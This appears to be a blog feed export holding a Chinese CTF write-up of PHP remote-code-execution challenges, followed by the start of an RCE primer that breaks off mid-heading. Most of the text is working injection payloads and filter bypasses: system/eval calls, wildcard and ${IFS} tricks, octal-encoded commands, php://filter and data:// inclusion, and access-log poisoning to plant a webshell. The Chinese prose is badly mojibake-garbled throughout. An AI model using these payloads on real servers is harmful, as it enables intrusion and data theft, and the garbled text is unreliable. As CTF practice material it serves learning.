        <content type="html"><![CDATA[<p>SHOWRCE</p><p>æ¥ä¸‹æ¥å¼€å§‹æˆ‘ä»¬çš„RCEåˆ·é¢˜SHOW</p><p>29ï¼š</p><p>if(isset(<br>$_GET[â€˜câ€™]));if(!preg_match(â€œ&#x2F;flag&#x2F;iâ€,$c)){eval($c);<br>}else{<br>highlight file( FILE );</p><p>å…ˆçœ‹ä»£ç åˆ†æå‡ºæ¥è¿™ä¸ªæ˜¯å‘½ä»¤æ‰§è¡Œï¼Œè®©æˆ‘ä»¬getä¼ å‚c,ç„¶åè¿‡æ»¤äº†flagå’Œä»–çš„å¤§å°å†™</p><p>é‚£ä¹ˆpayloadå°±å‡ºæ¥äº†ï¼šc&#x3D;system(â€˜tac fl*.phpâ€™);(ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–çš„æŸ¥çœ‹ç¬¦)</p><p>å…¶ä»–ï¼šc&#x3D;system(â€˜tac flâ€â€ag.phpâ€™);c&#x3D;system(â€˜tac fl&#96;&#96;ag.phpâ€™);c&#x3D;system(â€˜ta\c fl\ag.phpâ€™);ç­‰ç­‰</p><p>30ï¼š</p><p>if(isset($_GET[â€˜câ€™])){8c &#x3D; S GETLâ€™câ€™]:if(!preg_match(â€œ&#x2F;flag|system|php&#x2F;iâ€, $c)){eval($c):<br>}else{<br>highlight_file( FILE);</p><p>å’Œä¸Šé¢çš„å·®ä¸å¤šï¼Œå°±æ˜¯è¿‡æ»¤çš„å¤šäº†</p><p>payload:</p><p>?c&#x3D;passthru(â€œtac fla*â€);</p><p>?c&#x3D;echo<code>tac fla*</code>;</p><p>?c&#x3D;$a&#x3D;sys;$b&#x3D;tem;$c&#x3D;$a.$b;$c(â€œtac fla*â€);</p><p>?c&#x3D;echo shell_exec(â€œtac fla*â€);</p><p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(â€œtac flag.phpâ€);</p><p>echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;(showç­”æ¡ˆ)</p><p>31ï¼š</p><p>å¤šè¿‡æ»¤äº†cat sort è¿™ä¸ªæ€ä¹ˆè¶Šæ¥è¶Šå¤šäº†ï¼Œå¯ä»¥è¿›è¡Œä¼ å‚ï¼šc&#x3D;eval($_GET[a]);&amp;a&#x3D;system(â€˜cat flag.phpâ€™);ä¹Ÿå¯ä»¥ä½¿ç”¨passthru(è¦æ³¨æ„è¿‡æ»¤äº†ç©ºæ ¼)</p><p>32ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸å¯ä»¥ç”¨passthruåšï¼Œä¸è¿‡æ²¡å…³ç³»ï¼Œå¯ä»¥ä½¿ç”¨ä¼ªåè®®åšï¼Œä½†æ˜¯é¦–å…ˆè¦å…ˆä¼ å‚ï¼š</p><p>palyoad:</p><p>?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?></p><p>ä¸Šé¢çš„å¯ä»¥ä½¿ç”¨åˆ°36ï¼Œä¸è¿‡è¦æ³¨æ„ä¸€äº›è¿‡æ»¤ï¼Œæ¯”å¦‚ç©ºæ ¼ä»€ä¹ˆçš„</p><p>37ï¼š</p><p>if(isset($_GET[â€˜câ€™])){   $c &#x3D; $_GET[â€˜câ€™];   if(!preg_match(â€œ&#x2F;flag&#x2F;iâ€, $c)){     include($c);     echo $flag;     } </p><p>ä½¿ç”¨é€‰æ‹©ä½¿ç”¨data:[?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><p>æˆ–è€…ä¼ å°ğŸï¼š</p><p>?c&#x3D;include$_GET[a]?%3E&amp;a&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br> &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯</p><p>ç„¶åä¸€ç›´åˆ°39å…³äº†ä¸Šé¢çš„éƒ½å¤§å·®ä¸å·®</p><p>40ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¸€ä¸‹å­ç»™æˆ‘å¼„ä¸ä¼šäº†ï¼Œ</p><p>åªèƒ½çœ‹wpåšäº†ï¼š</p><p>æ³•ä¸€</p><p>c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;éœ€è¦POSTä¼ å…¥å‚æ•°ä¸º1&#x3D;system(â€˜tac fl*â€™);</p><p>get_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>array_pop() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚</p><p>æ³•äºŒ</p><p>c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); æˆ–è€… c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚å®ƒå¯ä»¥ä»£æ›¿pos(localeconv())</p><p>localeconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„ä¸”ç¬¬ä¸€é¡¹ä¸ºâ€.â€</p><p>pos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›</p><p>current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œå’Œpos()ä¸€æ ·</p><p>scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚è¿™é‡Œå› ä¸ºå‚æ•°ä¸ºâ€.â€æ‰€ä»¥éå†å½“å‰ç›®å½•</p><p>array_reverse():æ•°ç»„é€†ç½®</p><p>next():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥</p><p>show_source():æŸ¥çœ‹æºç </p><p>pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚è¯¥å‡½æ•°æ˜¯current()å‡½æ•°çš„åˆ«åã€‚</p><p>æ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„â€å½“å‰â€å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p>æç¤ºï¼šè¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚</p><p>ç›¸å…³çš„æ–¹æ³•ï¼š</p><p>current()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</p><p>end()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>prev()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>reset()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>each()è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</p><p>ç„¶å41è·‘yuå¸ˆå‚…è„šæœ¬å°±okäº†</p><p>42ï¼š</p><p>ç»ˆäºç®€å•äº†ï¼›</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;   $c=$_GET[&#x27;c&#x27;];   system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;else&#123;   highlight_file(__FILE__); &#125;</span><br></pre></td></tr></table></figure><p>è¿™è¡Œä»£ç æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿå‘½ä»¤ï¼Œè¯¥å‘½ä»¤ç”±å˜é‡ $c çš„å€¼æŒ‡å®šã€‚&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 æ˜¯ä¸€ä¸ª shell  é‡å®šå‘æ“ä½œï¼Œæ„å‘³ç€å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰å’Œæ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰éƒ½è¢«é‡å®šå‘åˆ°  &#x2F;dev&#x2F;nullï¼Œå³è¢«ä¸¢å¼ƒï¼Œï¼ˆä¸ªäººç†è§£æ˜¯å†…å®¹æ³¨é‡Šæ³¨é‡Šï¼‰ç”¨æˆ·ä¸ä¼šçœ‹åˆ°ä»»ä½•è¾“å‡ºç»“æœ æ‰€ä»¥ç›´æ¥&#x2F;c&#x3D;cat flag.php||%0aä½¿ç”¨ç®¡é“ç¬¦è¿›è¡Œç»•è¿‡è®©ä»–æ‰§è¡Œå‰é¢çš„</p><p>43ï¼š</p><p>æ¯”å‰é¢å¤šè¿‡æ»¤äº†catã€ï¼›ï¼Œé‚£å°±åˆ©ç”¨tacï¼Œuniq,less,more,strings,nlå‘½ä»¤æ¥æ‰“å°ï¼Œâ€œ||â€åˆ†å‰²</p><p>æˆ–è€…ä½¿ç”¨é‡å®šå‘ï¼šnl%20flag.php| tee 1.txtç„¶åè®¿é—®1.txt</p><p>44å‘¢å’Œ43å·®ä¸å¤š,å°±å¤šäº†ä¸€ä¸ªflag,å¯ä»¥?l*.php</p><p>45(å¤šäº†cat):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;     system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); </span><br></pre></td></tr></table></figure><p>palyad:c&#x3D;uniq${IFS}?l*.php||</p><p>46-53:</p><p>éƒ½å·®ä¸å¤šï¼Œå¯ä»¥å¤šè®°ç‚¹æ›¿ä»£catçš„å’Œsystemä»¥åŠç©ºæ ¼çš„</p><p>54ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤ äº†å¾ˆå¤šå‘½ä»¤ã€‚ ä¸­é—´è¿™äº›ä¸ªå¾ˆå¤šçš„æ˜Ÿå·çš„å†…å®¹ï¼Œå…¶å® æ˜¯è¯´ï¼Œå«æœ‰ cat,moreè¿™æ ·çš„ä¼šè¢«åŒ¹é…ï¼Œå¦‚cat é‚£ä¹ˆca323390ftæˆ–c232fa3kdfst, å‡¡æ˜¯æŒ‰åºå‡ºç°äº†cat éƒ½è¢«åŒ¹é…ã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥å†™ca?å› ä¸ºè¿™æ ·æ˜¯åŒ¹é…ä¸åˆ°å‘½ä»¤çš„ã€‚ åªèƒ½æŠŠå…¨è·¯å¾„å†™å‡ºæ¥ï¼Œå¦‚&#x2F;bin&#x2F;ca?,ä¸&#x2F;bin&#x2F;ca?åŒ¹é…çš„ï¼Œåªæœ‰&#x2F;bin&#x2F;catå‘½ä»¤ï¼Œè¿™æ ·å°±ç”¨åˆ°äº†cat å‘½ä»¤äº†ã€‚</p><p>äºæ˜¯ï¼Œæœ‰äº†payload</p><p>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}????.???   ç„¶å   æŸ¥çœ‹æºç </p><p>55:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>ç”±äºè¿‡æ»¤äº†å­—æ¯ï¼Œä½†æ²¡æœ‰è¿‡æ»¤æ•°å­—å¯ä»¥è€ƒè™‘æ•°å­—ç¼–ç ï¼š$â€™\164\141\143â€™ $â€™\146\154\141\147\56\160\150\160â€™</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨é€šé…ç¬¦?æ¥è¿›è¡Œä»£æ›¿</p><p>?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p><p>æ›¿æ¢åå˜æˆ</p><p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???</p><p>56+57ï¼šè¿™ä¸ªçš„è¯æ²¡çœ‹æ˜ç™½</p><p>58-65ï¼š</p><p>è¿›è¡Œpostä¼ c,å¹¶ä¸”eval($c)</p><p>è¿™é‡Œå˜›ï¼Œè¦å¼•å…¥æ–°çš„å‡½æ•°ï¼šshow_source,highlight_file;è¿™ä¸¤ä¸ªéƒ½æ˜¯å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤º</p><p>é‚£ä¹ˆpalyadå°±å‡ºæ¥äº†ï¼šc&#x3D;show_source(â€˜flag.phpâ€™);&#x2F;highlight_file(â€˜flag.phpâ€™);</p><p>æˆ–è€…å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«å†™ï¼šc&#x3D;include($_POST[â€˜wâ€™]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>66-67:</p><p>è¿™ä¸ªå‘¢å¼•å…¥ä¸€ä¸ªæ–°çš„ä¸œè¥¿ï¼šprint_r(scandir(â€œ&#x2F;â€œ));(print_ræˆ–è€…ä¹Ÿå¯ä»¥æ¢æˆvar_dump&#x2F;var_export)å’Œå‰é¢çš„ä¸€æ ·ä¸è¿‡åœ¨æœ¬ç›®å½•ä¸‹é¢æ²¡æœ‰flag.php&#x2F;txt,é‚£ä¸ªæ–°çš„ä¸œè¥¿æ˜¯æŸ¥çœ‹æŒ‡å®šçš„ç›®å½•ï¼Œå…ˆè¿”å›æ ¹ç›®å½•ï¼Œç„¶åå°±å‘ç°æ ¹ç›®å½•ä¸‹é¢å­˜åœ¨ç€flag.txtï¼Œé‚£ä¸ªå°±å¯ä»¥show_source(â€œ&#x2F;flag.txtâ€);æˆ–è€…å¦ä¸€ä¸ªï¼›</p><p>68-70:</p><p>è¿™ä¸€å…³ç¦ç”¨äº†highlight_fileã€‚ä¾ç„¶å¯ä»¥ä½¿ç”¨ä¸Šä¸€å…³çš„var_dumpç»“åˆscandiræ¥æ˜¾ç¤ºæ ¹ç›®å½•çš„æ–‡ä»¶åˆ—è¡¨ã€‚<br> c&#x3D;var_dump(scandir(â€˜&#x2F;â€˜));ä¹‹åshow_sourceå’Œhighlight_fileéƒ½ç”¨ä¸äº†,è¯•è¯•includeå’Œrequireå³å¯ã€‚</p><p>71ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ä½ è¦ä¸Šå¤©å—ï¼Ÿ</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªçš„è¯ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ä»–å°†æ•°å­—å’Œå­—æ¯æ¢æˆï¼Ÿäº†ï¼Œé‚£ä¸ªå¯ä»¥åˆ©ç”¨ç¼“å†²åŒºç”¨exit();ç»“æŸ</p><p>æå‰ç»ˆæ­¢ç¨‹åºï¼Œå³æ‰§è¡Œå®Œä»£ç ç›´æ¥é€€å‡ºï¼Œå¯ä»¥è°ƒç”¨çš„å‡½æ•°æœ‰ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>ç„¶åçš„è¯å°±æ˜¯ä½¿ç”¨c&#x3D;var_exportè¿›è¡Œæ‰«ææ–‡ä»¶æ ¹ç›®å½•ï¼šc&#x3D;var_export(scandir(â€œ&#x2F;â€œ));exit;å†c&#x3D;include(â€œ&#x2F;flag.txtâ€);exit();</p><p>å‰©ä¸‹çš„ä»¥åå†è¯´ï¼Œæœ‰ç‚¹ä¸ä¼šäº†ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2025/03/02/RCE/"/>
      <url>/2025/03/02/RCE/</url>
      
        <content type="html"><![CDATA[<h4 id="1-ç®€è¿°ï¼š"><a href="#1-ç®€è¿°ï¼š" class="headerlink" title="1.ç®€è¿°ï¼š"></a>1.ç®€è¿°ï¼š</h4><p>åœ¨å¾ˆå¤šWebåº”ç”¨ä¸­ï¼Œå¼€å‘äººå‘˜ä¼šä½¿ç”¨ä¸€äº›ç‰¹æ®Šå‡½æ•°ï¼Œè¿™äº›å‡½æ•°ä»¥ä¸€äº›å­—ç¬¦ä¸²ä½œä¸ºè¾“å…¥ï¼ŒåŠŸèƒ½æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²å½“ä½œä»£ç æˆ–è€…å‘½ä»¤æ¥è¿›è¡Œæ‰§è¡Œã€‚å½“ç”¨æˆ·å¯ä»¥æ§åˆ¶è¿™äº›å‡½æ•°çš„è¾“å…¥æ—¶ï¼Œå°±äº§ç”Ÿäº†RCEæ¼æ´ã€‚</p><p>å±å®³ï¼šå¯ä»¥è®©ç”¨æˆ·ï¼ˆé€šå¸¸æ˜¯ç³»ç»Ÿç®¡ç†å‘˜æˆ–æ™®é€šç”¨æˆ·ï¼‰æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤çš„æ¼æ´ã€‚è¿™ç§æ¼æ´é€šå¸¸å­˜åœ¨äºæŸäº›ç¨‹åºæˆ–è„šæœ¬ä¸­ï¼Œå…è®¸è¾“å…¥å‚æ•°è¢«ç¼–ç å¹¶ä¼ é€’ç»™å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p> æ¯”å¦‚ï¼šå¦‚æœåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£ï¼Œæ¯”å¦‚å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šï¼Œä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚è€Œå¦‚æœè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨ã€‚</p><h4 id="2-åˆ†ç±»ï¼šå‘½ä»¤æ‰§è¡Œå’Œä»£ç æ‰§è¡Œ"><a href="#2-åˆ†ç±»ï¼šå‘½ä»¤æ‰§è¡Œå’Œä»£ç æ‰§è¡Œ" class="headerlink" title="2.åˆ†ç±»ï¼šå‘½ä»¤æ‰§è¡Œå’Œä»£ç æ‰§è¡Œ"></a>2.åˆ†ç±»ï¼šå‘½ä»¤æ‰§è¡Œå’Œä»£ç æ‰§è¡Œ</h4><h4 id="3-å¸¸è§å‡½æ•°ï¼š"><a href="#3-å¸¸è§å‡½æ•°ï¼š" class="headerlink" title="3.å¸¸è§å‡½æ•°ï¼š"></a>3.å¸¸è§å‡½æ•°ï¼š</h4><h5 id="1-å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š"><a href="#1-å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š" class="headerlink" title="(1)å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š"></a>(1)å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()ï¼šèƒ½å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œä¸”è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœï¼›</span><br><span class="line"></span><br><span class="line">exec()ï¼šèƒ½å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯åªè¿”å›æ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œ(çº¦ç­‰äºæ— å›æ˜¾)ï¼›</span><br><span class="line"></span><br><span class="line">shell_exec()ï¼šèƒ½å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œ</span><br><span class="line"></span><br><span class="line">passthru()ï¼šèƒ½å°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œåªè°ƒç”¨å‘½ä»¤ä¸è¿”å›ä»»ä½•ç»“æœï¼Œä½†æŠŠå‘½ä»¤çš„è¿è¡Œç»“æœåŸæ ·è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šï¼›</span><br><span class="line"></span><br><span class="line">popen()ï¼šæ‰“å¼€è¿›ç¨‹æ–‡ä»¶æŒ‡é’ˆ</span><br><span class="line"></span><br><span class="line">proc_open()ï¼šä¸popen()ç±»ä¼¼</span><br><span class="line"></span><br><span class="line">pcntl_exec()ï¼šåœ¨å½“å‰è¿›ç¨‹ç©ºé—´æ‰§è¡ŒæŒ‡å®šç¨‹åºï¼›</span><br><span class="line"></span><br><span class="line">åå¼•å·``ï¼šåå¼•å·``å†…çš„å­—ç¬¦ä¸²ä¼šè¢«è§£æä¸ºOSå‘½ä»¤ï¼›</span><br><span class="line"></span><br><span class="line">è¡¥å……ï¼šOSå‘½ä»¤æ‰§è¡Œæ˜¯æŒ‡å°†ç”¨æˆ·çš„æ–‡æœ¬å‘½ä»¤é€šè¿‡æ“ä½œç³»ç»Ÿè½¬åŒ–ä¸ºäºŒè¿›åˆ¶æŒ‡ä»¤å¹¶æ‰§è¡Œçš„è¿‡ç¨‹</span><br></pre></td></tr></table></figure><h5 id="2-ä»£ç æ‰§è¡Œå‡½æ•°ï¼š"><a href="#2-ä»£ç æ‰§è¡Œå‡½æ•°ï¼š" class="headerlink" title="(2)ä»£ç æ‰§è¡Œå‡½æ•°ï¼š"></a>(2)ä»£ç æ‰§è¡Œå‡½æ•°ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval()ï¼šå°†å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç æ‰§è¡Œï¼›</span><br><span class="line"></span><br><span class="line">assert()ï¼šå°†å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç æ‰§è¡Œï¼›</span><br><span class="line"></span><br><span class="line">preg_replace()ï¼šæ­£åˆ™åŒ¹é…æ›¿æ¢å­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">create_function()ï¼šä¸»è¦åˆ›å»ºåŒ¿åå‡½æ•°ï¼›</span><br><span class="line"></span><br><span class="line">call_user_func()ï¼šå›è°ƒå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‡½æ•°åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå‡½æ•°çš„å‚æ•°ï¼›</span><br><span class="line"></span><br><span class="line">call_user_func_array()ï¼šå›è°ƒå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‡½æ•°åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå‡½æ•°å‚æ•°çš„æ•°ç»„ï¼›</span><br><span class="line"></span><br><span class="line">å¯å˜å‡½æ•°ï¼šè‹¥å˜é‡åæœ‰æ‹¬å·ï¼Œè¯¥å˜é‡ä¼šè¢«å½“åšå‡½æ•°åä¸ºå˜é‡å€¼(å‰ææ˜¯è¯¥å˜é‡å€¼æ˜¯å­˜åœ¨çš„å‡½æ•°å)çš„å‡½æ•°æ‰§è¡Œï¼›</span><br></pre></td></tr></table></figure><h4 id="4-å¸¸è§ç»•è¿‡ï¼š"><a href="#4-å¸¸è§ç»•è¿‡ï¼š" class="headerlink" title="4.å¸¸è§ç»•è¿‡ï¼š"></a>4.å¸¸è§ç»•è¿‡ï¼š</h4><h5 id="1-ç®¡é“ç¬¦ç»•è¿‡ï¼š"><a href="#1-ç®¡é“ç¬¦ç»•è¿‡ï¼š" class="headerlink" 